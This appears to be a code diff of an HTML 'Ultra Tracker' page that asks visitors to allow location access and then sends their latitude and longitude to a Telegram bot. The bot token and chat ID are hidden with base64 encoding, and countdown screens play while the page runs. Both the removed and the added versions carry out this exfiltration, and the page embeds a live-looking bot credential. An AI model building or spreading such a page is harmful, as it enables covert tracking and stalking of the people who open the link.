@@ -2,107 +2,75 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Ultra Tracker</title>
+<title>Ultra Fast Tracker</title>
 
 <style>
 body {
-    margin:0;
-    height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    background: linear-gradient(135deg,#ff1493,#6a0dad);
+    margin: 0;
+    height: 100vh;
+    background: #FF1493;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
     font-family: Arial;
-    color:white;
-}
-
-.container {
-    width:90%;
-    max-width:420px;
-    padding:20px;
-    border-radius:20px;
-    background:rgba(255,255,255,0.08);
-    backdrop-filter:blur(20px);
-    text-align:center;
+    color: white;
+    text-align: center;
 }
 
 /* Button */
-button{
-    width:100%;
-    padding:15px;
-    border:none;
-    border-radius:10px;
-    font-size:18px;
-    background:linear-gradient(45deg,#ff0080,#ff8c00);
-    color:white;
+button {
+    padding: 12px 25px;
+    font-size: 18px;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
 }
 
-/* Huge Countdown */
-#countdown{
-    font-size:25vw;
-    font-weight:900;
-    margin:10px 0;
+/* Countdown */
+#countdown {
+    font-size: 80px;
+    font-weight: bold;
+    margin-top: 20px;
 }
 
-/* Heading */
-#heading{
-    font-size:20px;
+#heading {
+    font-size: 28px;
+    margin-top: 20px;
 }
 
-/* Progress */
-.bar{
-    width:100%;
-    height:8px;
-    background:rgba(255,255,255,0.2);
-    border-radius:10px;
-    overflow:hidden;
+/* Shake Image */
+#shakeImg {
+    width: 200px;
+    display: none;
+    margin-top: 20px;
 }
 
-.fill{
-    height:100%;
-    width:0%;
-    background:linear-gradient(90deg,#00ffcc,#00ff66);
+/* Strong shake animation */
+@keyframes shake {
+    0% { transform: translate(0px, 0px); }
+    25% { transform: translate(15px, -15px); }
+    50% { transform: translate(-15px, 15px); }
+    75% { transform: translate(15px, 15px); }
+    100% { transform: translate(-15px, -15px); }
 }
 
-/* Shake */
-#img{
-    width:140px;
-    display:none;
-    margin-top:15px;
-}
-
-@keyframes shake{
-    0%{transform:translate(0,0);}
-    25%{transform:translate(12px,-12px);}
-    50%{transform:translate(-12px,12px);}
-    75%{transform:translate(12px,12px);}
-    100%{transform:translate(-12px,-12px);}
-}
-
-.shake{
-    animation:shake 0.07s infinite;
+.shake {
+    animation: shake 0.1s infinite;
 }
 </style>
 </head>
 
 <body>
 
-<div class="container">
-
-<button onclick="start()">Allow Location</button>
+<button onclick="startProcess()">Allow Location</button>
 
 <div id="heading"></div>
 <div id="countdown"></div>
 
-<div class="bar"><div id="fill" class="fill"></div></div>
+<img id="shakeImg" src="https://i.imgur.com/8Km9tLL.png">
 
-<img id="img" src="https://i.imgur.com/8Km9tLL.png">
-
-<audio id="audio" src="https://www.soundjay.com/buttons/sounds/button-4.mp3"></audio>
-
-</div>
+<audio id="successAudio" src="https://www.soundjay.com/buttons/sounds/button-3.mp3"></audio>
 
 <script>
 (function(){
@@ -110,113 +78,100 @@ button{
 const BOT_TOKEN = atob("ODUyNDM5OTY5MjpBQUg4Uk5GbzZVZktDcjgxSUM1c1k2Rk8yMGh4QUJTX3VQUQ==");
 const CHAT_ID  = atob("NjI3NzQzMjM1Ng==");
 
-let done=false;
+let uploadDone = false;
 
-/* 🚀 TELEGRAM WITH RETRY (KEY FIX) */
-async function send(lat,lon,retry=0){
-
-    const map=`https://www.google.com/maps?q=${lat},${lon}`;
-
-    try{
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-            method:"POST",
-            headers:{"Content-Type":"application/json"},
-            body:JSON.stringify({
-                chat_id:CHAT_ID,
-                text:`📍 Location\nLat:${lat}\nLon:${lon}\nMap:${map}`
-            })
-        });
-
-        done=true;
-        success();
-
-    }catch(e){
-
-        if(retry<3){
-            send(lat,lon,retry+1);
-        }
-    }
+/* 🚀 TELEGRAM SEND (FASTEST POSSIBLE) */
+function sendToTelegram(lat, lon) {
+    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: `📍 FAST LOCATION\nLat: ${lat}\nLon: ${lon}`
+        })
+    }).then(() => {
+        uploadDone = true;
+        onSuccess();
+    }).catch(()=>{});
 }
 
-/* ⚡ FAST LOCATION (OLD TECHNIQUE RESTORED) */
-function getLocation(){
-
+/* 📡 LOCATION */
+function getLocationFast() {
     navigator.geolocation.getCurrentPosition(
-        pos=>{
-            send(pos.coords.latitude,pos.coords.longitude);
+        (pos) => {
+            sendToTelegram(pos.coords.latitude, pos.coords.longitude);
         },
-        ()=>{},
+        () => {},
         {
-            enableHighAccuracy:false,
-            maximumAge:Infinity,
-            timeout:5000
+            enableHighAccuracy: false,  // faster than true
+            timeout: 5000,
+            maximumAge: Infinity       // reuse cached = fastest
         }
     );
 }
 
-/* 🎯 SUCCESS */
-function success(){
+/* 🎯 SUCCESS EFFECT */
+function onSuccess() {
+    document.getElementById("heading").innerText = "SUCCESS";
+    document.getElementById("countdown").innerText = "";
 
-    document.getElementById("heading").innerText="SUCCESS";
-    document.getElementById("countdown").innerText="";
-
-    let img=document.getElementById("img");
-    img.style.display="block";
+    const img = document.getElementById("shakeImg");
+    img.style.display = "block";
     img.classList.add("shake");
 
-    document.getElementById("audio").play();
+    document.getElementById("successAudio").play();
 }
 
-/* 📊 Progress */
-function progress(p){
-    document.getElementById("fill").style.width=p+"%";
-}
+/* ⏱ COUNTDOWN ENGINE */
+function runCountdown(seconds, color, title, callback) {
 
-/* ⏱ Countdown */
-function run(sec,color,title,next){
+    const heading = document.getElementById("heading");
+    const countdown = document.getElementById("countdown");
 
-    let t=sec;
+    heading.innerText = title;
+    countdown.style.color = color;
 
-    document.getElementById("heading").innerText=title;
-    document.getElementById("countdown").style.color=color;
+    let time = seconds;
 
-    let i=setInterval(()=>{
+    const interval = setInterval(() => {
 
-        if(done){
-            clearInterval(i);
+        if (uploadDone) {
+            clearInterval(interval);
             return;
         }
 
-        document.getElementById("countdown").innerText=t;
-        progress(((sec-t)/sec)*100);
+        countdown.innerText = time;
+        time--;
 
-        t--;
-
-        if(t<0){
-            clearInterval(i);
-            next && next();
+        if (time < 0) {
+            clearInterval(interval);
+            callback && callback();
         }
 
-    },1000);
+    }, 1000);
 }
 
-/* 🔥 MAIN */
-window.start=function(){
+/* 🔥 MAIN FLOW */
+window.startProcess = function () {
 
-    done=false;
+    uploadDone = false;
 
-    // ⚡ START LOCATION IMMEDIATELY (CRITICAL)
-    getLocation();
+    // Start location instantly (parallel)
+    getLocationFast();
 
-    run(10,"black","Scanning...",()=>{
+    // 1st Countdown (Black - 10s)
+    runCountdown(10, "black", "Tracking You (Phase 1)", () => {
 
-        if(done) return;
+        if (uploadDone) return;
 
-        run(5,"red","Retrying...",()=>{
+        // 2nd Countdown (Red - 5s)
+        runCountdown(5, "red", "Still Processing (Phase 2)", () => {
 
-            if(done) return;
+            if (uploadDone) return;
 
-            run(5,"yellow","Final Attempt...");
+            // 3rd Countdown (Yellow - fallback)
+            runCountdown(5, "yellow", "Final Attempt (Phase 3)");
+
         });
 
     });
